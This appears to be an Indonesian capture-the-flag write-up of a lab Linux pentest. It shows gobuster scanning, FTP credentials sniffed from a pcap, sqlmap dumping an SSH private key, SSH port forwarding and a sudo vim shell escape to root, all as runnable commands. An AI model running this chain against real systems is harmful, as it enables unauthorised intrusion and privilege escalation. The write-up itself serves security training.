# 🛡️ Cyber Academy - Linux Service Pentesting Write-Up

**Target IP:** `34.142.169.86`  
**Solved By:** _Nama/Tim Anda_

---

## 📜 Pendahuluan
Tantangan ini menguji kemampuan *Network Services Pentesting* mulai dari reconnaissance, analisis forensik jaringan, eksploitasi web (SQL Injection), SSH tunneling, hingga privilege escalation untuk mendapatkan akses root.

---

## 🔎 Phase 1 & 2: Reconnaissance & Forensics

### 🔍 Port Scanning & Enumerasi Web
Melakukan pemindaian awal menggunakan Nmap dan enumerasi direktori dengan Gobuster.

```bash
gobuster dir -u http://34.142.169.86 -w /usr/share/seclists/Discovery/Web-Content/common.txt
Temuan: Direktori tersembunyi /pcap.

🕵️ Network Traffic Analysis
Pada /pcap terdapat file suspicioustraffic.pcap. File dianalisis menggunakan Wireshark.

Filter:
ftp atau tcp.stream eq <stream_id>

Temuan kredensial FTP (plain text):

User: apanihftp

Pass: akucintacps

📁 Enumerasi FTP & Hint
Akses FTP menggunakan kredensial tersebut:

bash
Copy code
ftp 34.142.169.86
# Login: apanihftp / akucintacps
Ditemukan file hint.txt milik root yang berisi:

bash
Copy code
Server Error. Cek database di /product.php?id=1
💻 Phase 3: Web Exploitation (SQL Injection)
Ada kerentanan SQL Injection pada parameter id di /product.php.

🎯 Identifikasi Database
bash
Copy code
sqlmap -u "http://34.142.169.86/product.php?id=1" --dbs
Database: ctf_db

📤 Dump Table Users
bash
Copy code
sqlmap -u "http://34.142.169.86/product.php?id=1" -D ctf_db -T users -C username,ssh_key --dump
Hasil:

Username: cyberacademy

SSH Key: RSA Private Key dalam format rusak (single line dengan \n literal)

🌐 Phase 4: Network Security (User Flag) — “Hidden Tunnel”
🔧 Perbaikan Format SSH Key
SSH key hasil SQLMap harus diperbaiki agar bisa digunakan.

bash
Copy code
echo -e '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (dipendekkan untuk repo)
LS5uZXRzZWM=\n-----END OPENSSH PRIVATE KEY-----' > id_rsa && chmod 600 id_rsa
🌉 SSH Tunneling
Masuk menggunakan SSH:

bash
Copy code
ssh -i id_rsa cyberacademy@34.142.169.86
Flag user berada di server internal 127.0.0.1:8080, diakses via port forwarding:

bash
Copy code
ssh -i id_rsa -L 9090:127.0.0.1:8080 cyberacademy@34.142.169.86
Akses di browser:
👉 http://localhost:9090

Flag 1: Hidden Tunnel

💥 Phase 5: Privilege Escalation (Root Flag) — “The Escalation”
Cek sudo permissions:

bash
Copy code
sudo -l
Output:

bash
Copy code
(ALL) NOPASSWD: /usr/bin/vim
🚀 Eksploitasi Vim Sudo Binary
Karena dapat menjalankan vim sebagai root tanpa password, kita bisa spawn shell:

bash
Copy code
sudo vim -c ':!/bin/sh'
🏁 Capture Root Flag
bash
Copy code
cat /root/root_flag.txt
Flag 2: The Escalation

✅ Status
All Flags Captured.
